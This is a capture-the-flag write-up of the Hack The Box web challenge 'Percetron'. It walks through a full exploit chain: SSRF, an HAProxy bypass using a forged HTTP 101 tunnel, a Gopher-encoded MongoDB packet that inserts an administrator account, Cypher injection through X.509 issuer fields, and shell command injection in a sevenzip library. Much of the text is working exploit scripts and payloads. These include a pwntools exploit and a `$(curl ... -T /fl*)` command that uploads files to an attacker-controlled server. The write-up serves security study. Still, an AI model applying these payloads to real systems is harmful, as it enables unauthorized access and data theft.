# Percetron

## Overview

**Percetron** is a Hack The Box web challenge in which the source code is
provided. The application combines Express, MongoDB, Neo4j and HAProxy, and
each component contributes one link to the exploitation chain.

The objective is to move from an ordinary registered account to code
execution inside the container. The complete route is:

```text
Authenticated user
    -> SSRF endpoint
    -> HAProxy 101 tunnel bypass
    -> Gopher request to MongoDB
    -> administrator account
    -> Cypher injection through an X.509 certificate
    -> command injection in sevenzip
    -> flag exfiltration
```

The challenge instance used in this writeup is:

```text
154.57.164.77:31514
```

## 1. Application architecture

After creating an account and signing in, the application exposes a dashboard
with a URL health-checking feature. The supplied source shows that Express
listens internally on port `3000`, while HAProxy publishes the service on port
`1337` inside the container:

```text
client -> HAProxy:1337 -> Express:3000
                         |-> MongoDB:27017
                         `-> Neo4j
```

MongoDB stores the users with a very small Mongoose schema:

```javascript
const userSchema = new mongoose.Schema({
    username: { type: String, unique: true },
    password: String,
    permission: String,
});
```

Registration always creates an unprivileged account:

```javascript
await db.registerUser(username, password, "user");
```

Administrative routes are guarded by the value saved in the session:

```javascript
if (!req.session.loggedin || req.session.permission != "administrator") {
    return res.status(401).send({message: "Not allowed"});
}
```

The login query accepts request values without first enforcing that they are
strings, which suggests NoSQL injection. That avenue does not solve the first
stage, however, because a fresh instance has no administrator document to
impersonate. We need to create one ourselves.

## 2. Comparing the health-check endpoints

There are two authenticated endpoints capable of making server-side requests.
The public route, `/healthcheck`, uses Axios after validating the supplied URL:

```javascript
router.get("/healthcheck", authMiddleware, (req, res) => {
    const targetUrl = req.query.url;

    if (!check(targetUrl)) {
        return res.status(403).json({message: "Access to URL is denied"});
    }

    axios.get(targetUrl, {
        maxRedirects: 0,
        validateStatus: () => true,
        timeout: 40000
    }).then(resp => res.status(resp.status).send());
});
```

Its filter rejects ports `1337` and `3000`, paths containing `healthcheck`,
and several representations of localhost:

```javascript
exports.check = (url) => {
    const parsed = new URL(url);

    if (isNaN(parseInt(parsed.port))) return false;
    if (parsed.port == "1337" || parsed.port == "3000") return false;
    if (parsed.pathname.toLowerCase().includes("healthcheck")) return false;

    const bad = [
        "localhost", "127", "0177", "000", "0x7", "0x0",
        "@0", "[::]", "0:0:0", "①②⑦"
    ];

    return !bad.some(value =>
        parsed.hostname.toLowerCase().includes(value)
    );
};
```

The development endpoint is considerably more useful. It passes the URL to
`curl`, follows redirects, and does not call `check()`:

```javascript
exports.getUrlStatusCode = (url) => {
    return new Promise((resolve, reject) => {
        const curlArgs = [
            "-L", "-I", "-s", "-o", "/dev/null", "-w", "%{http_code}", url
        ];

        execFile("curl", curlArgs, (error, stdout) => {
            if (error) return reject(error);
            resolve(parseInt(stdout, 10));
        });
    });
};
```

This would allow schemes supported by `curl`, including `gopher://`. The
problem is that HAProxy blocks the route before Express receives it:

```text
backend forward_default
    http-request deny if { path -i -m beg /healthcheck-dev }
    server s1 127.0.0.1:3000
```

Therefore, the first goal is to reach `/healthcheck-dev` without having the
second request evaluated by that ACL.

## 3. Building a MongoDB packet

MongoDB is available locally on port `27017`. We can speak its wire protocol
directly and insert a document into the `users` collection. The following Node
script serializes an administrator account as BSON and prepends the required
message header:

```javascript
const BSON = require("bson");
const fs = require("fs");

const document = {
    insert: "users",
    $db: "percetron",
    documents: [{
        username: "administrator",
        password: "$2a$10$yPklsGI8uhnptd0TP.rUBuwFM1yLjnguL3bTaQ7j3qWFsUIbUKbUC",
        permission: "administrator",
    }],
};

const bson = BSON.serialize(document);
const header = Buffer.from(
    "5D0000000000000000000000DD0700000000000000",
    "hex"
);
const packet = Buffer.concat([header, bson]);

packet.writeUInt32LE(packet.length, 0);
fs.writeFileSync("bson.bin", packet);
```

The bcrypt hash belongs to the password `asdf`. Once the binary packet has
been generated, it can be transformed into the percent-encoded bytes required
by a Gopher URL:

```bash
python3 -c 'print("".join(f"%{b:02x}" for b in open("bson.bin", "rb").read()))'
```

The resulting URL is:

```text
gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%72%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00
```

Axios cannot use this scheme, so the payload has to pass through the blocked
development route.

## 4. Turning an HTTP 101 response into a tunnel

Path-normalization tricks such as `//healthcheck-dev` and
`/./healthcheck-dev` do not produce a useful disagreement between HAProxy and
Express. A more effective option is to abuse protocol switching.

When the backend responds with `101 Switching Protocols`, HAProxy assumes the
connection has been upgraded and changes to tunnel mode. Any bytes sent over
the same TCP connection afterward are relayed to the backend instead of being
parsed as a new HTTP request by the proxy. Express will still parse those bytes
as HTTP, which lets us send the forbidden path directly to it.

First, a server under our control must answer every request with status `101`:

```python
#!/usr/bin/env python3

from flask import Flask

app = Flask(__name__)


@app.route("/")
def index():
    return "", 101


app.run(host="0.0.0.0", port=5000)
```

The attack then consists of two requests over one socket:

1. Request `/healthcheck` with the controlled URL. Axios fetches it and
   propagates the `101` response.
2. Reuse the upgraded connection to request `/healthcheck-dev` with the
   Gopher payload.

The `connect.sid` value can be copied from the browser after logging in with
any account. This script performs both steps:

```python
#!/usr/bin/env python3

from pwn import remote, sys


SSRF_URL = "gopher://0.0.0.0:27017/_%dc%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%c7%00%00%00%02%69%6e%73%65%72%74%00%06%00%00%00%75%73%65%72%73%00%02%24%64%62%00%0a%00%00%00%70%65%72%63%65%74%72%6f%6e%00%04%64%6f%63%75%6d%65%6e%74%73%00%92%00%00%00%03%30%00%8a%00%00%00%02%75%73%65%72%6e%61%6d%65%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%02%70%61%73%73%77%6f%72%64%00%3d%00%00%00%24%32%61%24%31%30%24%79%50%6b%6c%73%47%49%38%75%68%6e%70%74%64%30%54%50%2e%72%55%42%75%77%46%4d%31%79%4c%6a%6e%67%75%4c%33%62%54%61%51%37%6a%33%71%57%46%73%55%49%62%55%4b%62%55%43%00%02%70%65%72%6d%69%73%73%69%6f%6e%00%0e%00%00%00%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%00%00%00%00"

host, port = sys.argv[1].rsplit(":", 1)
callback_url = sys.argv[2]
session_cookie = sys.argv[3]

io = remote(host, int(port), level="debug")

first = (
    f"GET /healthcheck?url={callback_url} HTTP/1.1\r\n"
    "Host: 127.0.0.1:1337\r\n"
    f"Cookie: connect.sid={session_cookie}\r\n"
    "\r\n"
)
io.send(first.encode())
io.recv()

second = (
    f"GET /healthcheck-dev?url={SSRF_URL} HTTP/1.1\r\n"
    "Host: 127.0.0.1:1337\r\n"
    f"Cookie: connect.sid={session_cookie}\r\n"
    "\r\n"
)
io.send(second.encode())
io.recv()
io.close()
```

With the Flask server reachable from the challenge, execution looks like this:

```bash
python3 exploit.py \
  154.57.164.77:31514 \
  http://12.34.56.78:5000 \
  's%3A<SESSION_VALUE>'
```

The second response may be a `500 Internal Server Error`. That status is not a
failure of the exploit: `curl` cannot interpret MongoDB's binary response as
an HTTP status code, but the Gopher data has already been delivered. We can
now log out and authenticate as:

```text
username: administrator
password: asdf
```

The previously hidden **Management** section becomes available.

## 5. Cypher injection through certificate metadata

Administrators can submit an X.509 certificate. The backend parses its issuer
fields and interpolates them into a Cypher query without parameterization:

```javascript
const insertCertQuery = `
    CREATE (:Certificate {
        common_name: '${certInfo.issuer.commonName}',
        file_name: '${certPath}',
        org_name: '${certInfo.issuer.organizationName}',
        locality_name: '${certInfo.issuer.localityName}',
        state_name: '${certInfo.issuer.stateOrProvinceName}',
        country_name: '${certInfo.issuer.countryName}'
    });
`;
```

Because the certificate's issuer is attacker-controlled, a malicious Common
Name can close the first property and replace `file_name`. A block comment
spanning into the Organization value keeps the final query syntactically
valid.

This matters because `/panel/management/dl-certs` trusts every `file_name`
read back from Neo4j. It resolves the parent directories and sends them to
`@steezcram/sevenzip`:

```javascript
const absolutePath = path.resolve(__dirname, filename);
const fileDirectory = path.dirname(absolutePath);

sevenzip.compress("zip", {
    dir: fileDirectory,
    destination: zipName,
    is64: true
}, () => {});
```

## 6. From a forged path to command execution

The vulnerable `sevenzip` package launches its command with a shell. Although
the directory is placed between double quotes, shell command substitution
such as `$(...)` is still evaluated. We can therefore store a path in Neo4j
whose parent directory contains a command.

The project already includes a `generateCert` helper. From a Node REPL inside
a local copy of the challenge, generate a valid certificate with malicious
issuer fields:

```javascript
const { generateCert } = require("./util/x509");

const cert = generateCert(
    `', file_name: '/app/$(curl 12.34.56.78 -T /fl*)/asdf.crt', /*`,
    `*/ org_name: 'asdf`,
    "locality",
    "state",
    "ES"
);

console.log(cert.cert);
console.log(cert.pubKey);
console.log(cert.privKey);
```

Here, `12.34.56.78` represents the IP address of our controlled server. The
payload changes the Neo4j `file_name` property to:

```text
/app/$(curl 12.34.56.78 -T /fl*)/asdf.crt
```

The application later extracts its parent directory and constructs a shell
command equivalent to:

```text
7za a -tzip "/tmp/<random>.zip" "/app/$(curl 12.34.56.78 -T /fl*)" ...
```

As a result, `curl` expands `/fl*` to the randomized flag filename and uploads
that file to our server. Paste the generated certificate, public key and
private key into **Management > Add Certificate**, then save it.

Before triggering the vulnerable archive operation, start a listener on the
controlled host:

```bash
sudo nc -nlvp 80
```

Finally, press **Download All** in the management panel. The archive itself is
irrelevant; creating it evaluates the injected command. The listener receives
a PUT request similar to this one:

```http
PUT /flage7d441ffa4.txt HTTP/1.1
Host: 12.34.56.78
User-Agent: curl/7.70.0
Content-Length: 49

HTB{br34k_all_m34sur35_4nd_bypas5__4l1_f1r3wal1s}
```

## Flag

```text
HTB{br34k_all_m34sur35_4nd_bypas5__4l1_f1r3wal1s}
```

## Conclusion

Percetron is solved by chaining several weaknesses rather than relying on one
direct bug. The unrestricted development health check can reach MongoDB with
Gopher, but HAProxy first has to be moved into tunnel mode with a forged HTTP
`101` response. The resulting administrator account exposes certificate
management, where unsafe Cypher construction grants control of a stored file
path. That path finally reaches a shell-enabled archive library and becomes
command execution.

The broader lesson is that validation at one layer is not enough when several
parsers handle the same input. HAProxy, Express, URL parsers, Cypher and the
shell all interpret data differently, and each boundary creates another
opportunity to turn a small flaw into a complete compromise.
